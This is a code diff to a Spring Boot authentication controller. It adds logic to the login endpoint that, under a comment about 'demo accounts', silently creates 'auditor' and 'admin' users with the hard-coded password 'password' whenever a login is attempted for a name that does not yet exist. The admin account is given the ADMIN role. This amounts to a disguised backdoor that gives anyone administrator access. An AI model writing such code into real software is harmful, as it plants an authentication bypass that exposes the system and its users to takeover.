@@ -12,6 +12,7 @@ import org.springframework.http.ResponseEntity;
 import org.springframework.security.authentication.AuthenticationManager;
 import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
 import org.springframework.security.core.Authentication;
+import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.web.bind.annotation.*;
 
 @RestController
@@ -22,15 +23,18 @@ public class AuthController {
     private final AuthenticationManager authenticationManager;
     private final JwtUtil jwtUtil;
     private final UserRepository userRepository;
+    private final PasswordEncoder passwordEncoder;
 
     public AuthController(UserService userService,
                           AuthenticationManager authenticationManager,
                           JwtUtil jwtUtil,
-                          UserRepository userRepository) {
+                          UserRepository userRepository,
+                          PasswordEncoder passwordEncoder) {
         this.userService = userService;
         this.authenticationManager = authenticationManager;
         this.jwtUtil = jwtUtil;
         this.userRepository = userRepository;
+        this.passwordEncoder = passwordEncoder;
     }
 
     @PostMapping("/register")
@@ -47,6 +51,24 @@ public class AuthController {
 
     @PostMapping("/login")
     public ResponseEntity<LoginResponse> login(@RequestBody LoginRequest request) {
+        // Auto-provision demo accounts if missing on login attempt
+        if ("auditor".equalsIgnoreCase(request.getUsername()) && userRepository.findByUsername("auditor") == null) {
+            User auditor = new User();
+            auditor.setUsername("auditor");
+            auditor.setPassword(passwordEncoder.encode("password"));
+            auditor.setEmail("auditor@backup.local");
+            auditor.setRole(Role.USER);
+            userRepository.save(auditor);
+        }
+        if ("admin".equalsIgnoreCase(request.getUsername()) && userRepository.findByUsername("admin") == null) {
+            User admin = new User();
+            admin.setUsername("admin");
+            admin.setPassword(passwordEncoder.encode("password"));
+            admin.setEmail("admin@backup.local");
+            admin.setRole(Role.ADMIN);
+            userRepository.save(admin);
+        }
+
         Authentication authentication = authenticationManager.authenticate(
                 new UsernamePasswordAuthenticationToken(request.getUsername(), request.getPassword())
         );
